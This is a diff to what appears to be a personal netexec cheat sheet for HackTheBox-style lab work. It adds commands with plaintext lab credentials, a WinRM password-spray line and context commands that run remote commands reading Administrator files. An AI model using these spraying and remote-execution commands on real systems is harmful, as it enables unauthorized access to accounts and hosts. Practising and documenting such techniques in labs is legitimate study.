@@ -15,7 +15,7 @@ tags:
 Generate the krb5.conf file:
 
 ```bash
-netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file krb5.conf
+netexec smb 10.10.100.152 -u Eric.Wallows -p 'EricLikesRunning800'  --generate-krb5-file krb5.conf
 
 ```
 
@@ -54,7 +54,7 @@ netexec smb ip -u user -k --use-kcache
 # Generate krb5.conf file
 netexec smb ip -u user -p password --generate-krb5-file /path
 export KRB5_CONFIG=/path
-
+# example: netexec smb 10.10.100.152 -u Eric.Wallows -p 'EricLikesRunning800'  --generate-krb5-file krb5.conf
 
 ### 
 # Execute commands
@@ -64,6 +64,10 @@ netexec smb ip -d corp.com -u user -p password  -x "type c:\Users\Administrator\
 # List the shares
 netexec smb ip -d corp.com -u user -p password  --shares 
  
+
+####
+# 
+nxc winrm 10.10.100.154 -u users.txt  -p 'hghgib6vHT3bVWf' -t 100 --continue-on-success --local-auth
 
 
 ```
